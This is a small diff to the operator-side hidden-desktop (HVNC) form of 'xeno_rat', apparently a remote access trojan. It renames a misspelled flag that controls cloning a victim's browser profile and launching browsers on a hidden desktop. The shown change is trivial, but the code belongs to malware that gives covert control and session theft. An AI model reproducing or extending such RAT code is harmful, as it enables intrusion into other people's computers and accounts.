@@ -19,7 +19,7 @@ namespace xeno_rat_server.Forms
         Node ImageNode;
         string DesktopName = "hidden_desktop";
         bool playing = false;
-        bool is_clonning_browser = false;
+        bool is_cloning_browser = false;
         string[] qualitys = new string[] { "100%", "90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
         CustomPictureBox customPictureBox1;
         public Hvnc(Node _client)
@@ -126,15 +126,15 @@ namespace xeno_rat_server.Forms
 
         private async Task EnableBrowserClone() 
         {
-            if (!playing || is_clonning_browser) return;
+            if (!playing || is_cloning_browser) return;
             await client.SendAsync(new byte[] { 6 });
-            is_clonning_browser = true;
+            is_cloning_browser = true;
         }
         private async Task DisableBrowserClone()
         {
-            if (!playing || !is_clonning_browser) return;
+            if (!playing || !is_cloning_browser) return;
             await client.SendAsync(new byte[] { 7 });
-            is_clonning_browser = false;
+            is_cloning_browser = false;
         }
 
         private async Task StartChrome() 
@@ -239,7 +239,7 @@ namespace xeno_rat_server.Forms
         private async void button5_Click(object sender, EventArgs e)
         {
             await StartEdge();
-            if (is_clonning_browser) 
+            if (is_cloning_browser) 
             {
                new Thread(()=>MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
             }
@@ -248,7 +248,7 @@ namespace xeno_rat_server.Forms
         private async void button6_Click(object sender, EventArgs e)
         {
             await StartChrome();
-            if (is_clonning_browser)
+            if (is_cloning_browser)
             {
                 new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
             }
@@ -257,7 +257,7 @@ namespace xeno_rat_server.Forms
         private async void button7_Click(object sender, EventArgs e)
         {
             await StartFirefox();
-            if (is_clonning_browser)
+            if (is_cloning_browser)
             {
                 new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
             }
